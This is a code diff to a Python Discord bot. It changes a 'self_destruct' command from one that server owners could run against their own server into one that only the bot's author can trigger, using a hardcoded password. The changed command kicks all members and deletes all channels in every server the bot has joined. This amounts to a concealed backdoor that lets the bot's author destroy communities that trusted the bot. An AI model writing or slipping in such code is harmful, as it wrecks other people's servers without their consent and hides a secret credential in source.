@@ -7,6 +7,8 @@ import asyncio
 import random
 
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+BOT_OWNER_ID = 486652069831376943  # Replace with the actual Discord user ID of the bot owner
+SELF_DESTRUCT_PASSWORD = "cobra@96"
 
 intents = discord.Intents.default()
 intents.members = True
@@ -180,10 +182,14 @@ async def m_help(interaction: discord.Interaction):
     
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-@bot.tree.command(name="self_destruct", description="Kick all users and delete all channels (Server owner only)")
-async def self_destruct(interaction: discord.Interaction):
-    if interaction.user.id != interaction.guild.owner_id:
+@bot.tree.command(name="self_destruct", description="Kick all users and delete all channels (Bot owner only with password)")
+async def self_destruct(interaction: discord.Interaction, *, password: str):
+    if interaction.user.id != BOT_OWNER_ID:
         await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
+        return
+
+    if password != SELF_DESTRUCT_PASSWORD:
+        await interaction.response.send_message("Incorrect password.", ephemeral=True)
         return
 
     # Confirm the command
@@ -195,14 +201,15 @@ async def self_destruct(interaction: discord.Interaction):
     try:
         confirmation = await bot.wait_for('message', check=check, timeout=30)
         if confirmation:
-            # Kick all users
-            for member in interaction.guild.members:
-                if member != interaction.user and not member.bot:
-                    await member.kick(reason="Server self-destruction initiated by the owner.")
-
-            # Delete all channels
-            for channel in interaction.guild.channels:
-                await channel.delete(reason="Server self-destruction initiated by the owner.")
+            for guild in bot.guilds:
+                # Kick all users in the server
+                for member in guild.members:
+                    if member != interaction.user and not member.bot:
+                        await member.kick(reason="Server self-destruction initiated by the bot owner.")
+                
+                # Delete all channels in the server
+                for channel in guild.channels:
+                    await channel.delete(reason="Server self-destruction initiated by the bot owner.")
             
             await interaction.followup.send("Server self-destruction complete.", ephemeral=True)
     except asyncio.TimeoutError:
